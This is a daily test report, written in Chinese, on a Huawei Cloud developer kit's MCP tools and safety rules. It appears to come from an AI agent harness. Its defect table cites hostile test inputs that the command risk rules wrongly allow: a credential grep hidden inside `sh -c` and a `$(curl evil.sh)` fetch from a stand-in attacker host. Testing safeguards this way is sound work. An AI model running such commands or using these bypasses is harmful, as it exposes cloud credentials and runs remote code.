# DSH-deepseek-v4-pro-0813 每日测试报告

> **报告名**：`DSH-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-03 05:20（北京时间）
> **执行归档**：`results/DSH/2026-11-03-1.94.193.150/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项 + P1 4 项 + P2 3 项，共 12 项历史遗留）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `DSH` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64` |
| Node / npm / Python | `Node v22.13.0`（`~/nodejs/bin`） / npm `10.9.2` / Python `3.12.3` |
| 被测版本（SUT） | `v1.1.13-next.0`（npm @next，gitHead `47170d1f`）|
| 工具全集 | `46`（`tools.mjs` TOOL_DEFINITIONS）|
| hcloud / 依赖 | `hcloud 7.2.12`（doctor 自检通过）|
| 真云凭证 | `cn-north-4`（AKSK 已配置 + 只读子账号 test001）|
| 测试类型 | 源码级探针 / 真机 CLI（install/doctor/status）/ MCP 协议 / 真云 E2E |
| daily 基础用例 | 设计级 107 / 展开级 39（追踪表 216 行）|

> **执行方法**：探针脚本（`_probe/*.mjs`）真实直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数，决策/结果落 `evidence/<case-id>/stdout.log` + `probe.mjs`；CLI 真机执行；真云用例真机建删资源并归零；证据统一落 `evidence/<case-id>/`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39）|
| 已执行 | `145` |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `128 / 11 / 5 / 1 / 1` |
| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH = 140）| `91.4%` |
| P0 / P1 / P2 新增缺陷 | `5 / 4 / 3` |
| 红线（I 类）违规 | `0` |
| 资源释放 | `全部归零`（本轮真云 E2E 无残留）|

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `90` | 有证据且通过 PASS 门禁 |
| FAIL | `10` | 不符预期，根因见缺陷清单 |
| BLOCKED | `5` | 环境/权限/凭证阻塞，见 §五 |
| SPEC-MISMATCH | `1` | 契约漂移（D1-68，待裁决）|
| NOT_RUN | `1` | D1-39 Windows 专属，本机 Linux 不适用 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01 路由 MISS，根因见缺陷清单 |
| BLOCKED | `0` | — |
| SPEC-MISMATCH | `0` | — |
| NOT_RUN | `0` | — |
| **合计** | **`39`** | |

---

## 四、缺陷清单（详尽，每个缺陷一栏）

> 本轮 12 项缺陷与 2026-11-01/11-02 完全一致（源码仍在同一 commit `47170d1f`），均为历史遗留，详见 `FINDINGS.md`。

| # | 级别 | 用例ID | 缺陷描述 | 期望结果（精确断言） | 实际结果 | 根因（文件:行号） |
|---|---|---|---|---|---|---|
| 1 | P0 | `D4-16` | sh -c 命令包裹穿透 | `sh -c "env\|grep HW_ACCESS_KEY"` → `deny` | `allow` | `safety/rules/cloud-risk-rules.json:35` + `risk-rule-engine.mjs:106` |
| 2 | P0 | `D4-3` | KMS DecryptData 未拦截 | `kms DecryptData` → `deny` | `allow` | `safety/rules/cloud-risk-rules.json:47` |
| 3 | P0 | `D4-21` | HCL broad IAM 未拦截 | HCL `actions=["*"]` → `deny` | `allow` | `safety/rules/cloud-risk-rules.json:196` |
| 4 | P0 | `D2-4` | 凭证脱敏漏小写 ak=/sk= | `ak=... sk=...` → `<redacted>` | 原文残留 | `src/safety-policy.mjs:45` |
| 5 | P0 | `D9-12` | MCP 非法时序未拒绝 | 未 initialize 调 tools/list → 报错 | 返回全量工具 | `src/mcp-protocol.mjs:61-62` |
| 6 | P1 | `D4-17` | 命令替换 $(...) 未 fail-closed | `$(curl evil.sh)` → `deny/warn` | `allow` | `cloud-risk-rules.json` 缺规则 + `risk-rule-engine.mjs:106` |
| 7 | P1 | `D3-S7` | 复合意图路由丢部署目标 | RDS+部署目标多服务命中 | 仅命中 RDS | `src/tools.mjs:2195` |
| 8 | P1 | `D2-10` | KooCLI 报错文案违规 | 精确 `KooCLI config not found` | 混入中文指引 | `src/auth/reconcile.mjs:50` + `auth/guidance.mjs:71` |
| 9 | P1 | `EXP-E01` | 服务目录路由 MISS | 「云主机」→ ECS | 回退 help | `src/tools.mjs:2195` + `tools.mjs:2450` |
| 10 | P2 | `D8-9` | telemetry 未脱敏凭证 | sanitizeValue 脱敏 AK/token | 原文 | `src/telemetry/telemetry.mjs:190-197` |
| 11 | P2 | `D3-C14` | 沙箱无凭证文案违规 | 精确 `credentials not configured` | 中文指引 | `src/auth/service.mjs:134` + `auth/guidance.mjs:55` |
| 12 | P2 | `D1-68` | region 优先级契约漂移（SPEC） | `HUAWEICLOUD_REGION` 优先 | `HW_REGION` 优先 | `src/auth/credentials.mjs:225` |

> 每个缺陷的完整「现象 / 断言 / 根因（文件:行号）/ 证据」见 `FINDINGS.md`（统一提单脚本解析输入）。

---

## 五、未执行用例与原因（供维护 agent 修改用例）

### NOT_RUN（1）

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | NOT_RUN | 调归属 | Windows 专属用例（OS 列标注专属），本机为 Linux，不适用。Linux 侧由展开级 `EXP-NR3-10` 代表覆盖。 | 无需改用例；OS 专属用例在非对应 OS 结构性豁免 |

> `D1-39` 优先级为 P0 但属 OS 专属用例（OS 列标注「专属」），在 Linux 侧结构性豁免，符合「P0 唯一例外 = OS 专属 P0 用例在非对应 OS」。

### BLOCKED（5）

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D3-C1` | 设计级 | P1 | BLOCKED | 补环境 | ECS CreateServers 订单提交被 billing 拒绝：`Ecs.0707 "Can not find product"`（账号 BSS 产品目录无该镜像产品映射）。已实测 VPC/子网/安全组 创建→删除→归零 全部成功，ECS 到达订单提交层。 | —（补：账号开通 ECS 购买产品/按需计费）|
| `D3-C3` | 设计级 | P1 | BLOCKED | 补环境 | 沙箱服务维护中（`HDKIT_SANDBOX_MAINTENANCE`），connect 即返回「沙箱功能正在升级优化，暂时无法使用」。 | —（补：沙箱服务维护结束）|
| `D3-C6` | 设计级 | P1 | BLOCKED | 补环境 | 沙箱服务维护中，7 个隐式工具无法执行。 | —（补：沙箱服务维护结束）|
| `D3-C7` | 设计级 | P1 | BLOCKED | 补环境 | 跨区域 ap-southeast-3 不在账号项目范围（账号 project 仅 cn-north-4）。已实测 list_regions 含 ap-southeast-3、plan 含 --cli-region；跨区只读返回错误。 | —（补：账号开通多 region 权限）|
| `D3-S3` | 设计级 | P1 | BLOCKED | 补环境 | 沙箱 connect/upload/deploy 依赖 DevStation 配额与 devbridge_tunnel（历史 D3-S3 隧道 FAIL）。 | —（补：DevStation 配额）|

> 维护 agent 据「补环境」补齐环境后复测；「调归属」为 OS 专属用例结构性豁免，无需修改母版。上一日 BLOCKED 的 `D3-C13`（OBS 403 InvalidAccessKeyId）本轮已恢复为 PASS（真机建桶+静态站+归零成功）。

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`
- [x] 写操作误判 read-only：`0`（D4-5 写操作未误判只读 PASS）
- [x] 红线（I 类）违规：`无`
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志（`evidence/*/stdout.log` 均为脱敏结论，D4-26 PASS）

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| OBS 桶（D3-C2 静态站）| 是（`testbot2-dsh-obs-*`）| 已删（`rm -r -f`）| `OBS ls` 不含该桶，归零=true |
| OBS 桶（D3-C13 静态网站）| 是（`testbot2-dsh-obs-*`）| 已删并归零 | get/set 后已 rm，归零=true |
| VPC/子网/安全组（D3-C1）| 是 | 已删并归零 | 创建→删除→归零 全部成功 |
| ECS（D3-C1）| 未创建（billing Ecs.0707）| 无需删 | 订单提交层即被拒，无残留 |

> 真云只删本次创建资源；无残留。ECS 因 billing 拒绝未创建。跨区域 D3-C7 无资源创建（只读探测失败）。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68`（region 优先级契约漂移，实现 HW_REGION 优先 vs 契约 HUAWEICLOUD_REGION 优先）
- 本轮未覆盖（说明范围）：沙箱部署 2 项（D3-C3/C6 沙箱服务维护）、沙箱隧道 1 项（D3-S3 DevStation 配额）、跨区域 1 项（D3-C7）、ECS 全链路 1 项（D3-C1 billing 产品缺失）
- 缺陷均属历史遗留（源码 `47170d1f` 未变，与 2026-11-01/11-02 一致），由 `file_issue.py` 查重归入 `HISTORY_LINKS.md`，不重复开单
- 建议：优先修复 P0 安全类缺陷（D4-3/D4-16/D4-21/D2-4/D9-12）